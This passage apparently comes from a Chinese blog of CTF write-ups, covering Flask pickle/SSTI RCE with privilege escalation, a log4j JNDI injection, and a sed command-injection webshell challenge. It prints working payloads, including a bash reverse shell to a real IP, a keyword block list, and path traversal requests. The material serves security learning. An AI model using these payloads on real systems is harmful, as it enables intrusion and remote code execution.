&#123;&#123;users.passwords[&#123;username&#125;]&#125;&#125;.&quot;</span>.format(username=username).format(users=users)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register fail!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app</span>.route(<span class="string">&#x27;/pic.php&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def <span class="title function_">pic</span><span class="params">()</span>:</span><br><span class="line">    <span class="keyword">if</span> not session or not session.get(<span class="string">&#x27;username&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;login.php&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> (pic:=request.args.get(<span class="string">&#x27;pic&#x27;</span>)) and os.path.isfile(filepath:=<span class="string">&quot;./uploads/&quot;</span>+pic.replace(<span class="string">&quot;../&quot;</span>,<span class="string">&quot;&quot;</span>)):</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">&#x27;username&#x27;</span>)==<span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> pickle.load(open(filepath,<span class="string">&quot;rb&quot;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span><span class="string">&#x27;&lt;img src=&quot;data:image/png;base64,&#x27;</span><span class="string">&#x27;&#x27;</span>+base64.b64encode(open(filepath,<span class="string">&quot;rb&quot;</span>).read()).decode()+<span class="string">&#x27;&#x27;</span><span class="string">&#x27;&quot;&gt;&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">    res=<span class="string">&quot;&lt;h1&gt;files in ./uploads/&lt;/h1&gt;&lt;br&gt;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> f in os.listdir(<span class="string">&quot;./uploads&quot;</span>):</span><br><span class="line">        res+=<span class="string">&quot;&lt;a href=&#x27;pic.php?pic=&quot;</span>+f+<span class="string">&quot;&#x27;&gt;./uploads/&quot;</span>+f+<span class="string">&quot;&lt;/a&gt;&lt;br&gt;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Users</span>:</span><br><span class="line">    passwords=&#123;&#125;</span><br><span class="line"></span><br><span class="line">    def <span class="title function_">register</span><span class="params">(self,username,password)</span>:</span><br><span class="line">        <span class="keyword">if</span> username in self.passwords:</span><br><span class="line">            <span class="keyword">return</span> False</span><br><span class="line">        <span class="keyword">if</span> <span class="title function_">len</span><span class="params">(self.passwords)</span>&gt;=<span class="number">3</span>:</span><br><span class="line">            <span class="keyword">for</span> u in <span class="title function_">list</span><span class="params">(self.passwords.keys()</span>):</span><br><span class="line">                <span class="keyword">if</span> u!=<span class="string">&quot;admin&quot;</span>:</span><br><span class="line">                    del self.passwords[u]</span><br><span class="line">        self.passwords[username]=hashlib.md5(password.encode()).hexdigest()</span><br><span class="line">        <span class="keyword">return</span> True</span><br><span class="line"></span><br><span class="line">    def <span class="title function_">login</span><span class="params">(self,username,password)</span>:</span><br><span class="line">        <span class="keyword">if</span> username in self.passwords and self.passwords[username]==hashlib.md5(password.encode()).hexdigest():</span><br><span class="line">            <span class="keyword">return</span> True</span><br><span class="line">        <span class="keyword">return</span> False</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">from werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"></span><br><span class="line">def <span class="title function_">waf</span><span class="params">(file)</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="title function_">len</span><span class="params">(os.listdir(<span class="string">&quot;./uploads&quot;</span>)</span>)&gt;=<span class="number">4</span>:</span><br><span class="line">        os.system(<span class="string">&quot;rm -rf /app/uploads/*&quot;</span>)</span><br><span class="line"></span><br><span class="line">    content=file.read().lower()</span><br><span class="line">    <span class="keyword">if</span> <span class="title function_">len</span><span class="params">(content)</span>&gt;=<span class="number">70</span>:</span><br><span class="line">        <span class="keyword">return</span> False</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> b in [b<span class="string">&quot;\n&quot;</span>,b<span class="string">&quot;\r&quot;</span>,b<span class="string">&quot;\\&quot;</span>,b<span class="string">&quot;base&quot;</span>,b<span class="string">&quot;builtin&quot;</span>,b<span class="string">&quot;code&quot;</span>,b<span class="string">&quot;command&quot;</span>,b<span class="string">&quot;eval&quot;</span>,b<span class="string">&quot;exec&quot;</span>,b<span class="string">&quot;flag&quot;</span>,b<span class="string">&quot;global&quot;</span>,b<span class="string">&quot;os&quot;</span>,b<span class="string">&quot;output&quot;</span>,b<span class="string">&quot;popen&quot;</span>,b<span class="string">&quot;pty&quot;</span>,b<span class="string">&quot;repeat&quot;</span>,b<span class="string">&quot;run&quot;</span>,b<span class="string">&quot;setstate&quot;</span>,b<span class="string">&quot;spawn&quot;</span>,b<span class="string">&quot;subprocess&quot;</span>,b<span class="string">&quot;sys&quot;</span>,b<span class="string">&quot;system&quot;</span>,b<span class="string">&quot;timeit&quot;</span>]:</span><br><span class="line">        <span class="keyword">if</span> b in content:</span><br><span class="line">            <span class="keyword">return</span> False</span><br><span class="line"></span><br><span class="line">    file.seek(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> secure_filename(file.filename)</span><br></pre></td></tr></table></figure><p>大致思路就是身份伪造admin 之后上传pickle反序列化文件RCE (bushi</p><p>这里上传文件需要经过一个waf ban了一些命令执行的关键字</p><p>首先来看如果获取admin session部分</p><p>register.php路由部分存在格式化字符串漏洞</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1708324003254-5150adb2-0266-4844-ab7b-1dbc99b60d49.png" alt="img"></p><p>注册一个用户名为<code>&#123;users.password&#125;</code>的用户 就能泄露得到users变量所定义的实现注册登录接口Users类中的passwords密码字典 </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1708324889166-fe7d82f4-4e4c-47cc-ae63-a876e581937f.png" alt="img"></p><p>再根据源码可知 secret_key就等于admin密码</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1708325079593-038ed659-b336-478f-8a56-79f162441664.png" alt="img"></p><p>拿到key之后 接下来进行session伪造</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1708327884992-4f58cd46-57e4-4e61-a706-f31c4f376c41.png" alt="img"></p><p>接下来是怎么打pickle反序列化</p><p>waf ban了<code>[b&quot;\n&quot;,b&quot;\r&quot;,b&quot;\\&quot;,b&quot;base&quot;,b&quot;builtin&quot;,b&quot;code&quot;,b&quot;command&quot;,b&quot;eval&quot;,b&quot;exec&quot;,b&quot;flag&quot;,b&quot;global&quot;,b&quot;os&quot;,b&quot;output&quot;,b&quot;popen&quot;,b&quot;pty&quot;,b&quot;repeat&quot;,b&quot;run&quot;,b&quot;setstate&quot;,b&quot;spawn&quot;,b&quot;subprocess&quot;,b&quot;sys&quot;,b&quot;system&quot;,b&quot;timeit&quot;]</code>这么多关键词</p><p>并且构造opcode的关键字符换行符<code>\n</code>也被过滤了 那么这条路是走不通了</p><p>根据源码本道题最关键的一点就是设置了flask app模板渲染路径为<code>./</code>也就是&#x2F;app路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.template_folder=&quot;./&quot;</span><br></pre></td></tr></table></figure><p>因此还存在render_template函数</p><p>我们文件上传路径为<code>./uploads/</code> 因此我们上传的文件都可以被作为flask的模板文件渲染</p><p>所以我们可以先上传一个恶意的ssti的poc模板文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum[<span class="string">&#x27;__glob&#x27;</span><span class="string">&#x27;als__&#x27;</span>][<span class="string">&#x27;__built&#x27;</span><span class="string">&#x27;ins__&#x27;</span>][<span class="string">&#x27;ev&#x27;</span><span class="string">&#x27;al&#x27;</span>](request.data)&#125;&#125;</span><br></pre></td></tr></table></figure><p>然后通过pickle反序列化调用render_template函数渲染他 就能实现RCE了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">from flask <span class="keyword">import</span> render_template</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EXP</span>():</span><br><span class="line">    def <span class="title function_">__reduce__</span><span class="params">(self)</span>:</span><br><span class="line">        <span class="keyword">return</span>(render_template,(<span class="string">&quot;uploads/poc&quot;</span>,))</span><br><span class="line"></span><br><span class="line">exp=EXP()</span><br><span class="line">f=open(<span class="string">&quot;exp&quot;</span>,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line">pickle.dump(exp,f)</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1708330604331-75dfe515-704b-4787-9cbd-1e32061b7a28.png" alt="img"></p><p>直接反弹shell比较好 因为题目每隔一段时间会删除我们上传的文件 </p><p>我们最后还要借助这一点去提权</p><p>可以看到clear.sh文件是root权限运行的 并且我们有w权限</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1708329277844-06fcefa9-b9a8-4f71-8454-529ec7003e0c.png" alt="img"></p><p>那么我们直接将clear.sh文件内容改为<code>echo &quot;cat /flag &gt; /1.txt&quot; &gt; clear.sh</code></p><p>稍等一段时间就会看到创建了有flag的1.txt</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1708329620984-7ffab1c7-ccf4-4dae-ade3-fb0b244fa44b.png" alt="img"></p><h1 id="Active-Takeaway"><a href="#Active-Takeaway" class="headerlink" title="Active-Takeaway"></a>Active-Takeaway</h1><p>知识点参考：<a href="https://www.yulegeyu.com/">https://www.yulegeyu.com/</a></p>]]></content>
      
      
      <categories>
          
          <category> 各赛事WP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NCTF2023学习</title>
      <link href="/post/ad0eb4be.html"/>
      <url>/post/ad0eb4be.html</url>
      
        <content type="html"><![CDATA[<p>NCTF2023学习</p><span id="more"></span><h1 id="logging"><a href="#logging" class="headerlink" title="logging"></a>logging</h1><p>考点：</p><ul><li>log4j</li></ul><p>进入界面啥也没有</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707108635415-633a0d58-3d6b-4807-8f3d-93a19af21bf7.png" alt="img"></p><p>根据题目提示可能考的是log4j，既然知道了那么JNDI的注入点应该在哪里呢</p><p>那只有试试请求头参数了</p><p>当试到<code>Accept</code>请求头时候，出现了406响应码</p><p> Accept 头, 如果 mine type 类型不对控制台会调用 logger 输出日志，还有 Host 头, 但是只能用一次, 第二次往后就不能再打印日志了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707108933959-c9377fd8-0dbc-4b0b-8009-e8b1933e4f51.png" alt="img"></p><p>HTTP 406状态码是指”不可接受”（Not Acceptable）。服务器收到的请求中包含了一个或多个要求资源的表示形式，但服务器无法生成与请求中所述的任何形式相匹配的响应。这意味着服务器无法提供与请求的Accept标头中指定的格式相匹配的响应。</p><p>这里存在JNDI注入点</p><p>进一步测试</p><p>发现确实存在 并且是出网的</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707109309619-e4e72221-5635-492f-add4-83038cc30886.png" alt="img"></p><p>那么我们起一个LDAP服务 带一个反弹shell的恶意类即可 </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707111725458-195820fc-e1f2-4eb9-bbfc-87b59ecb9064.png" alt="img"></p><p>推荐项目：<a href="https://github.com/WhiteHSBG/JNDIExploit">https://github.com/WhiteHSBG/JNDIExploit</a></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707111654925-92f362c0-d7d2-4b31-ad6b-80bf8ea5dab3.png" alt="img"></p><h1 id="Webshell-Generator"><a href="#Webshell-Generator" class="headerlink" title="Webshell Generator"></a>Webshell Generator</h1><p>点击下载我们的webshel之后，抓包</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707116858231-90f8e135-d1a2-4ee5-ab65-16e2b83bc76f.png" alt="img"></p><p>发现路由重定向 一眼丁真这里可能存在路径穿越<img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707116584160-c8dec344-445e-4b4b-b7ad-fdf8c9a37f43.png" alt="img"></p><p>可以</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707116900607-84865e2f-9506-418c-92f6-ae77aa6322e3.png" alt="img"></p><p>根目录flag文件不是<code>/flag </code>并且环境变量中的flag也被删了</p><p>还是老老实实来分析 首先看看index.php和 download.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">/download.php?file=/tmp/../../../var/www/html/index.php&amp;filename=</span><br><span class="line">&lt;?php</span><br><span class="line">function security_validate()</span><br><span class="line">&#123;</span><br><span class="line">    foreach ($_POST as $key =&gt; $value) &#123;</span><br><span class="line">        if (preg_match(&#x27;/\r|\n/&#x27;, $value)) &#123;</span><br><span class="line">            die(&quot;$key 不能包含换行符！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if (strlen($value) &gt; 114) &#123;</span><br><span class="line">            die(&quot;$key 不能超过114个字符！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">security_validate();</span><br><span class="line">if (@$_POST[&#x27;method&#x27;] &amp;&amp; @$_POST[&#x27;key&#x27;] &amp;&amp; @$_POST[&#x27;filename&#x27;]) &#123;</span><br><span class="line">    if ($_POST[&#x27;language&#x27;] !== &#x27;PHP&#x27;) &#123;</span><br><span class="line">        die(&quot;PHP是最好的语言&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $method = $_POST[&#x27;method&#x27;];</span><br><span class="line">    $key = $_POST[&#x27;key&#x27;];</span><br><span class="line">    putenv(&quot;METHOD=$method&quot;) or die(&quot;你的method太复杂了！&quot;);</span><br><span class="line">    putenv(&quot;KEY=$key&quot;) or die(&quot;你的key太复杂了！&quot;);</span><br><span class="line">    $status_code = -1;</span><br><span class="line">    $filename = shell_exec(&quot;sh generate.sh&quot;);</span><br><span class="line">    if (!$filename) &#123;</span><br><span class="line">        die(&quot;生成失败了！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = trim($filename);</span><br><span class="line">    header(&quot;Location: download.php?file=$filename&amp;filename=&#123;$_POST[&#x27;filename&#x27;]&#125;&quot;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]) &amp;&amp; isset($_GET[&#x27;filename&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $filename = $_GET[&#x27;filename&#x27;];</span><br><span class="line">    header(&quot;Content-type: application/octet-stream&quot;);</span><br><span class="line">    header(&quot;Content-Disposition: attachment; filename=$filename&quot;);</span><br><span class="line">    readfile($file);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>index.php通过<code>$filename = shell_exec(&quot;sh generate.sh&quot;);</code>来帮我们生成文件名</p><p>读来看看<code>generate.sh</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"></span><br><span class="line">set -e</span><br><span class="line"></span><br><span class="line">NEW_FILENAME=$(tr -dc a-z0-<span class="number">9</span> &lt;/dev/urandom | head -c <span class="number">16</span>)</span><br><span class="line">cp template.php <span class="string">&quot;/tmp/$NEW_FILENAME&quot;</span></span><br><span class="line">cd /tmp</span><br><span class="line"></span><br><span class="line">sed -i <span class="string">&quot;s/KEY/$KEY/g&quot;</span> <span class="string">&quot;$NEW_FILENAME&quot;</span></span><br><span class="line">sed -i <span class="string">&quot;s/METHOD/$METHOD/g&quot;</span> <span class="string">&quot;$NEW_FILENAME&quot;</span></span><br><span class="line"></span><br><span class="line">realpath <span class="string">&quot;$NEW_FILENAME&quot;</span></span><br></pre></td></tr></table></figure><p>可以看到我们输入的方法和webshell密码都会被导出到环境变量中 然后sh脚本文件会从环境变量中读入我们的方法和webshell密码然后拼接到sed命令中</p><p>那么这里可能存在shell命令注入 但是不行 只能展开为单个参数</p><p>查看sed命令选项 发现<code>-e</code>可以执行系统命令</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707117841890-a676e71f-c159-4565-8aea-eee5bb540b82.png" alt="img"></p><p>根据man手册[<a href="https://www.gnu.org/software/sed/manual/sed.html#sed-script-overview:~:text=can%20be%20separated%20by%20semicolons%20(%3B)]">https://www.gnu.org/software/sed/manual/sed.html#sed-script-overview:~:text=can%20be%20separated%20by%20semicolons%20(%3B)]</a>(<a href="https://www.gnu.org/software/sed/manual/sed.html#sed-script-overview:~:text=can">https://www.gnu.org/software/sed/manual/sed.html#sed-script-overview:~:text=can</a> be separated by semicolons (%3B))</p><p>sed指令可以通过换行符分隔，也可以通过<code>;</code>分隔。</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707118403799-dd68d48e-9449-43f4-99fc-b3d4767accb0.png" alt="img"></p><p>我们的payload：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">123</span>/g;e bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/124.221.177.174/7777 0&gt;&amp;1&quot;</span>;</span><br><span class="line">会被拼接为：</span><br><span class="line">sed -i <span class="string">&quot;s/METHOD/123/g;e bash -c &quot;</span>bash -i &gt;&amp; /dev/tcp/<span class="number">124.221</span><span class="number">.177</span><span class="number">.174</span>/<span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span><span class="string">&quot;;/g&quot;</span> <span class="string">&quot;$NEW_FILENAME&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707118249251-a7fc75f7-36f6-4440-a00f-c2bf08469ca1.png" alt="img"></p><p>成功</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707118266106-1ed123d2-5bc0-4190-8af3-c6593d6eccbf.png" alt="img"></p><h1 id="Wait-What"><a href="#Wait-What" class="headerlink" title="Wait What"></a>Wait What</h1><p>给了源码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="variable">express</span> <span class="operator">=</span> require(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="type">const</span> <span class="variable">child_process</span> <span class="operator">=</span> require(<span class="string">&#x27;child_process&#x27;</span>)</span><br><span class="line"><span class="type">const</span> <span class="variable">app</span> <span class="operator">=</span> express()</span><br><span class="line">app.use(express.json())</span><br><span class="line"><span class="type">const</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">80</span></span><br><span class="line"></span><br><span class="line">function <span class="title function_">escapeRegExp</span><span class="params">(string)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> string.replace(/[.*+?^$&#123;&#125;()|[\]\\]/g, <span class="string">&#x27;\\$&amp;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">let</span> <span class="variable">users</span> <span class="operator">=</span> &#123;</span><br><span class="line">    <span class="string">&quot;admin&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;user&quot;</span>: <span class="string">&quot;user&quot;</span>,</span><br><span class="line">    <span class="string">&quot;guest&quot;</span>: <span class="string">&quot;guest&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;hacker&#x27;</span>:<span class="string">&#x27;hacker&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">let</span> <span class="variable">banned_users</span> <span class="operator">=</span> [<span class="string">&#x27;hacker&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 你不准getflag</span></span><br><span class="line">banned_users.push(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="type">let</span> <span class="variable">banned_users_regex</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">function <span class="title function_">build_banned_users_regex</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">let</span> <span class="variable">regex_string</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> (let username of banned_users) &#123;</span><br><span class="line">        regex_string += <span class="string">&quot;^&quot;</span> + escapeRegExp(username) + <span class="string">&quot;$&quot;</span> + <span class="string">&quot;|&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    regex_string = regex_string.substring(<span class="number">0</span>, regex_string.length - <span class="number">1</span>)</span><br><span class="line">    banned_users_regex = <span class="keyword">new</span> <span class="title class_">RegExp</span>(regex_string, <span class="string">&quot;g&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//鉴权中间件</span></span><br><span class="line">function <span class="title function_">requireLogin</span><span class="params">(req, res, next)</span> &#123;</span><br><span class="line">    <span class="type">let</span> <span class="variable">username</span> <span class="operator">=</span> req.body.username</span><br><span class="line">    <span class="type">let</span> <span class="variable">password</span> <span class="operator">=</span> req.body.password</span><br><span class="line">    <span class="title function_">if</span> <span class="params">(!username || !password)</span> &#123;</span><br><span class="line">        res.send(<span class="string">&quot;用户名或密码不能为空&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (typeof username !== <span class="string">&quot;string&quot;</span> || typeof password !== <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        res.send(<span class="string">&quot;用户名或密码不合法&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 基于正则技术的封禁用户匹配系统的设计与实现</span></span><br><span class="line">    <span class="type">let</span> <span class="variable">test1</span> <span class="operator">=</span> banned_users_regex.test(username)</span><br><span class="line">    console.log(`使用正则$&#123;banned_users_regex&#125;匹配$&#123;username&#125;的结果为：$&#123;test1&#125;`)</span><br><span class="line">    <span class="keyword">if</span> (test1) &#123;</span><br><span class="line">console.log(<span class="string">&quot;第一个判断匹配到封禁用户：&quot;</span>,username)</span><br><span class="line">        res.send(<span class="string">&quot;用户&#x27;&quot;</span>+username + <span class="string">&quot;&#x27;被封禁，无法鉴权！&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 基于in关键字的封禁用户匹配系统的设计与实现</span></span><br><span class="line">    <span class="type">let</span> <span class="variable">test2</span> <span class="operator">=</span> (username in banned_users)</span><br><span class="line">    console.log(`使用in关键字匹配$&#123;username&#125;的结果为：$&#123;test2&#125;`)</span><br><span class="line">    <span class="keyword">if</span> (test2)&#123;</span><br><span class="line">        console.log(<span class="string">&quot;第二个判断匹配到封禁用户：&quot;</span>,username)</span><br><span class="line">        res.send(<span class="string">&quot;用户&#x27;&quot;</span>+username + <span class="string">&quot;&#x27;被封禁，无法鉴权！&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (username in users &amp;&amp; users[username] === password) &#123;</span><br><span class="line">        next()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.send(<span class="string">&quot;用户名或密码错误，鉴权失败！&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function <span class="title function_">registerUser</span><span class="params">(username, password)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (typeof username !== <span class="string">&quot;string&quot;</span> || username.length &gt; <span class="number">20</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;用户名不合法&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (typeof password !== <span class="string">&quot;string&quot;</span> || 